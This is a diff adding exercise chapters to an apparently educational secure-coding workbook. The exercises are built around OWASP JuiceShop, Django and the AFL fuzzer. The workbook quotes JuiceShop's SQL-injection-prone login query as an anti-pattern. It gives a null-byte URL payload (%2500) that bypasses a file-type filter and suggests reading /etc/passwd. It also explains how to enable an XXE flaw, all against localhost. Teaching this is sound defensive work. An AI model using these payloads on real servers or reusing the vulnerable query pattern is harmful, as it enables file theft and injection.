+{\bf Suggested method:}\\
+Run the program Git from your Debian Linux VM
+
+
+{\bf Hints:}\\
+Many hooks will depend on the language and what your policy states. Some hooks will be easy to implement, others will require others to agree. Think tabs vs spaces which will forever stay unresolved.
+
+{\bf Solution:}\\
+When you have tried adding a file with a bad name, and gotten an error, you are done. Feel free to experiment more with the hook.
+
+{\bf Discussion:}\\
+Many examples can be found on the internet.
+
+Example links:
+\begin{list2}
+\item \link{https://blogs.vmware.com/opensource/2020/02/03/git-repo-pre-commit-hooks/} which links to the next one
+\item A framework for managing and maintaining multi-language pre-commit hooks.\\
+\link{https://pre-commit.com/}
+\item Blog showing how to use this framework for checking a Kubernetes file:\\
+\link{https://www.magalix.com/blog/how-to-start-left-with-security-using-git-pre-commit-hooks}
+\end{list2}
+
+
+\chapter{JuiceShop Login 15 min}
+\label{ex:juice-shop-login}
+
+\begin{minted}[fontsize=\footnotesize]{sql}
+models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}'
+AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
+{ model: models.User, plain: true })
+\end{minted}
+
+{\bf Objective:}\\
+Try to find the JuiceShop login box implementation, we know it is vulnerable to SQL injection.
+
+
+{\bf Purpose:}\\
+Seeing bad code is a design pattern -- anti-pattern.
+
+
+{\bf Suggested method:}\\
+Find the source code, look for the database lookups.
+
+
+{\bf Hints:}\\
+The JuiceShop software is open source, and available at github:\\
+\link{https://github.com/juice-shop/juice-shop}
+
+Git clone and searching locally might give the best results.
+
+In this case we can search for \verb+SELECT * FROM+, using a simple tool like grep:
+
+\begin{minted}[fontsize=\footnotesize]{shell}
+user@Projects:juice-shop$ grep -ril SELECT | egrep -v "test|frontend|static"
+...
+REFERENCES.md
+routes/vulnCodeFixes.ts
+routes/search.ts
+routes/login.ts // oohhhh looks interesting
+routes/countryMapping.ts
+routes/vulnCodeSnippet.ts
+config/oss.yml
+config/mozilla.yml
+config/default.yml
+README.md
+\end{minted}
+
+
+{\bf Solution:}\\
+When you have found examples of the database lookups, you are done. See also discussion below though.
+
+
+{\bf Discussion:}\\
+Think about how this could be changed. How much would it require to change this into prepared statements.
+Also having good source code tools help a lot! Finding problems, getting an overview of code etc.
+
+
+
+\chapter{Django String Handling 20min}
+\label{ex:django-string}
+
+Recommendations for handling strings, how does Python help, how does Django handle strings, and input validation
+
+{\bf Objective:}\\
+Look into string handling in Django framework
+
+{\bf Purpose:}\\
+See that Python 3 and Django includes functions for conversion, so you dont need to write these yourself.
+
+{\bf Suggested method:}\\
+First look into Python3 string handling, for example by looking at\\
+\url{https://docs.python.org/3.9/library/text.html}
+
+Note: There may be a newer version, feel free to check multiple versions.
+
+Then look at Django string and unicode handling:
+\begin{list2}
+\item Look for string, url, encode, decode in\\
+\url{https://docs.djangoproject.com/en/4.1/ref/utils/}
+\item \url{https://docs.djangoproject.com/en/4.1/ref/unicode/}
+\end{list2}
+
+Note: There may be a newer version, feel free to check multiple versions.
+
+{\bf Hints:}\\
+Follow the URLs above, or more updated versions.
+
+{\bf Solution:}\\
+When you have looked up and seen the names of a few relevant functions like these below, you are done:
+
+\begin{alltt}
+django.utils.html escape(text)
+django.utils.safestring
+django.utils.dateparse
+\end{alltt}
+
+Note the links after where you can see the source implementation, for example:\\
+\url{https://docs.djangoproject.com/en/2.2/_modules/django/utils/html/#escape}
+
+
+{\bf Discussion:}\\
+Are strings easy to work with?
+
+
+\chapter{Django ORM 20 min}
+\label{ex:django-orm}
+
+\begin{minted}[fontsize=\small]{python}
+from django.db import models
+
+class Person(models.Model):
+    first_name = models.CharField(max_length=30)
+    last_name = models.CharField(max_length=30)
+\end{minted}
+
+\begin{minted}[fontsize=\small]{sql}
+CREATE TABLE myapp_person (
+    "id" serial NOT NULL PRIMARY KEY,
+    "first_name" varchar(30) NOT NULL,
+    "last_name" varchar(30) NOT NULL
+);
+\end{minted}
+
+{\bf Objective:}\\
+See how a mapping model, Object–relational mapping (ORM) can help reduce complexity for you.
+
+
+{\bf Purpose:}\\
+Using an ORM frees you from a lot of low level detail, and keeps your application more portable between database systems.
+
+
+{\bf Suggested method:}\\
+Read about the Django  Object–relational mapping (ORM) at:
+
+\begin{list2}
+\item \link{https://docs.djangoproject.com/en/4.0/topics/db/models/}
+\item \link{https://docs.djangoproject.com/en/4.0/topics/db/queries/}
+\end{list2}
+
+{\bf Hints:}\\
+Many programming languages use ORM and have similar functions.
+
+{\bf Solution:}\\
+When you have read about either the Django model, or a similar method in another framework or programming language you are done.
+
+{\bf Discussion:}\\
+I have myself used Grails,
+\emph{A powerful Groovy-based web application framework for the JVM built on top of Spring Boot}
+
+\link{https://grails.org/}
+
+
+\chapter{Django email validation 30 min}
+\label{ex:django-email}
+
+
+
+{\bf Objective:}\\
+Find a mature implementation for validating email, a common requirement in modern applications.
+
+We will use Django as an example.
+
+{\bf Purpose:}\\
+See if we can find an implementation that will suit our own projects, even if not using Django.
+
+{\bf Suggested method:}\\
+Find the Django email validation -- how is the validation done, can it be copied and reused somewhere else.
+
+{\bf Hints:}\\
+The Django software is open source, and available at github:\\
+\link{https://github.com/django/django}
+
+Git clone and searching locally might give the best results.
+
+\begin{minted}[fontsize=\footnotesize]{shell}
+$ pwd
+/home/user/projects/github/django
+user@Projects:django$ grep -ril email | less
+\end{minted}
+
+One file includes \verb+class EmailValidator:+ which sounds promising.
+
+
+{\bf Solution:}\\
+When you have found the files implementing the actual email validation, not all related files, only the one doing the validation -- you are done.
+
+{\bf Discussion:}\\
+Email addresses are notoriously hard to validate, since the standard is very complex. Often we can do with less, say if we want to use it as a user-id. Then we might decide NOT to support comments and things like \verb?hlk+kea@kramse.org?
+
+Which other validators would be nice to have, in your own library?
+
+
+\chapter{Truncate and Encoding Attacks JuiceShop up to 40min}
+\label{ex:truncate-encoding}
+
+{\bf Objective:}\\
+Try out some of the problems described in the book using active methods.
+
+{\bf Purpose:}\\
+The book describes problems with encodings but it can feel a bit fluffy unless you try and see for yourself. We have the JuiceShop which has errors similar to these.
+
+{\bf Suggested method:}\\
+There is an error in the JuiceShop that can be abused for reading files using encoding \verb+%2500+.
+
+Try to download the file \link{http://localhost:3000/ftp/eastere.gg}
+
+
+It should be possible to even retrieve the content of a file like \verb+C:\Windows\system.ini+ or
+\verb+/etc/passwd+ from the server and see if you can read a file. If they exist. This is related to XEE attacks, and seems hard to get working.
+
+Spoiler alert next page!
+\eject
+
+
+
+{\bf Hints:}\\
+Its ok to use the solution and work through the example.
+\url{http://localhost:3000/ftp/eastere.gg%2500.md}
+
+Also make sure to use \verb+NODE_ENV=unsafe+ flag when running docker if you want to try the XEE vuln!
+
+\begin{alltt}
+export NODE_ENV=unsafe
+docker run --rm -p 0.0.0.0:3000:3000 bkimminich/juice-shop
+\end{alltt}
+
+{\bf Solution:}\\
+When you feel you understand the problem of encoding/decoding and sending XML files to an application, reading files, you are done.
+
+{\bf Discussion:}\\
+Another problem are the filtering done in applications.
+
+In the JuiceShop we can access using URLs like this on the About Us page:\\
+\url{http://localhost:3000/ftp/legal.md?md_debug=true}
+
+Consider if the URL would match on .md and we were able to send a large filename ending in \verb+loongfilename.md+, but when truncated cut of exactly the \verb+.md+ part so we referenced another file.
+
+
+
+
+
+
+\chapter{Optional: Try American fuzzy lop up to 60min}
+\label{ex:american-fuzzy-lop}
+
+Try American fuzzy lop from \link{http://lcamtuf.coredump.cx/afl/}
+
+{\bf Objective:}\\
+Try a fuzzer. We will use the popular american fuzzy lop named after a breed of rabits.
+
+
+{\bf Purpose:}
+\begin{quote}
+American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road.
+\end{quote}
+Source: \link{http://lcamtuf.coredump.cx/afl/}
+
+{\bf Suggested method:}\\
+Open the web page \link{http://lcamtuf.coredump.cx/afl/}
+
+Look at the Quick Start Guide and README:\\
+\link{http://lcamtuf.coredump.cx/afl/QuickStartGuide.txt}\\
+\link{http://lcamtuf.coredump.cx/afl/README.txt}
+
+Follow the tutorial at:\\
+\link{http://spencerwuwu-blog.logdown.com/posts/1366733-a-simple-guide-of-afl-fuzzer}
+
+Hint: instead of modifying the bashrc just do a \verb+sudo make install+ to install the afl- programs in the right directories.
+
+Later if you like, modify our demo.c test program from earlier, and fuzz it.
+
+{\bf Hints:}\\
+Look at the many projects which have been tested by AFL, the \emph{bug-o-rama trophy case} on the web page.
+
+{\bf Solution:}\\
+When afl is installed on at least one laptop on the team, and has run a fuzzing session against a program - no matter if it found anything.
+
+{\bf Discussion:}\\
+For how long is it reasonable to fuzz a program? A few days - sure. Maybe run multiple sessions in parallel!
+
+
+
+
+
+
+\chapter{Securing the JuiceShop}
+\label{ex:secure-juiceshop}
+
+
+{\bf Objective:}\\
+Layout a plan for securing the Juice Shop
+
+{\bf Purpose:}\\
+Lets discuss how we can proceed if JuiceShop was a real shop in our organisation
+
+{\bf Suggested method:}\\
+Break down the immediate steps for securing this shop.
+
+Should we go and buy a security product for filtering requests?
+
+Should we start logging all requests and analyzing them?\\
+To see when we are attacked
+
+{\bf Hints:}\\
+There are some gaping holes that can be removed, files that could be downloaded.
+
+Some functions are old and can be removed or turned off.
+
+{\bf Solution:}\\
+There is no solution, the discussion is the solution.
+
+{\bf Discussion:}\\
+There are some things that can be \emph{fixed} in production, and some can't easily be redone without major interruption
+
+\end{document}
+
+
+
+\chapter{ xx min}
+\label{ex:}
+
+{\bf Objective:}\\
+Try the program XX locally your workstation
+
+
+{\bf Purpose:}\\
+Running XXX will allow you to analyse
+
+
+\begin{alltt}
+
+
+\end{alltt}
+
+
+{\bf Suggested method:}\\
+Run the program from your Kali Linux VM
+
+
+{\bf Hints:}\\
+PCAP is a packet capture library allowing you to read packets from the network.
+Tcpdump uses libpcap library to read packet from the network cards and save them.
+Wireshark is a graphical application to allow you to browse through traffic, packets and protocols.
+
+If the tool is not available first try: \verb+apt-get install *thetool*+
+
+Some tools will need to be checked out from Git and run or installed from source.
+
+{\bf Solution:}\\
+When you have tried the tool and seen some data you are done.
+
+{\bf Discussion:}\\
